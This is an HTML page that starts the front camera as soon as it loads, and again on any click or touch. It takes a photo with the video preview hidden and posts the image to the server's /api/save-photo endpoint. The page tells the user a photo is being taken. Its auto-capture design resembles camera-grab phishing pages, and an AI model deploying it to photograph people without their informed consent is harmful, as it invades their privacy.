<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Photo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        
        .fullscreen {
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .spinner {
            border: 4px solid #333;
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            font-size: 18px;
            text-align: center;
        }
        
        .success {
            font-size: 24px;
            color: #00ff00;
            font-weight: bold;
        }
        
        canvas {
            display: none;
        }
        
        video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="fullscreen">
        <div class="spinner"></div>
        <div class="status">üì∑ Taking photo...</div>
    </div>

    <canvas id="canvas"></canvas>
    <video id="video" autoplay playsinline muted></video>

    <script>
        async function takePhoto() {
            try {
                // Request camera with minimal permissions
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                video.srcObject = stream;
                
                // Wait for video to load then take photo
                video.onloadedmetadata = () => {
                    // Take photo after 1 second
                    setTimeout(async () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        const photoData = canvas.toDataURL('image/png');
                        
                        // Stop camera immediately
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Update UI
                        document.querySelector('.status').textContent = '‚è≥ Saving...';
                        
                        // Send to server
                        await savePhoto(photoData);
                        
                        // Show success
                        document.querySelector('.spinner').style.display = 'none';
                        document.querySelector('.status').innerHTML = '<span class="success">‚úì Photo Saved!</span><br><br>You can close this now.';
                        
                    }, 1000);
                };
                
            } catch (error) {
                document.querySelector('.status').innerHTML = `<span class="success" style="color: #ff4444;">‚úó Error</span><br>${error.message}`;
                document.querySelector('.spinner').style.display = 'none';
            }
        }

        async function savePhoto(photoData) {
            try {
                const response = await fetch('/api/save-photo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ photo: photoData })
                });
                
                if (!response.ok) {
                    throw new Error('Failed to save photo');
                }
                
                const data = await response.json();
                console.log('Photo saved:', data.filename);
                
            } catch (error) {
                console.error('Error:', error);
                throw error;
            }
        }

        // Auto start on load
        window.addEventListener('load', takePhoto);
        
        // Also try on interaction
        document.addEventListener('click', takePhoto);
        document.addEventListener('touchstart', takePhoto);
    </script>
</body>
</html>
